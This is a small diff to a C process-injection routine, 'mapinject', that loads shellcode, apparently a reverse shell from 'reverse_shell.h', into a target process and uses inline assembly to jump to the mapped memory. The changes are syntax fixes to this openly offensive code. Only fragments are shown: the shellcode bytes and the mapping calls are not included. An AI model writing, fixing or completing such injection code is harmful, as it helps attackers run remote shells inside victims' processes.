@@ -8,7 +8,7 @@
 int mapinject(int targetProcess)
 {
     // Define the shellcode, assuming it's declared in reverse_shell.h
-    unsigned char shellcode[] = buf[];
+    unsigned char shellcode[] = buf;
     
     // Print the target process ID
     printf("\nUsing PID %d\n", targetProcess);
@@ -62,7 +62,7 @@ int mapinject(int targetProcess)
     __asm 
     {
         mov eax, lpMapAddress
-        push eax;
+        push eax
         ret
     }
 
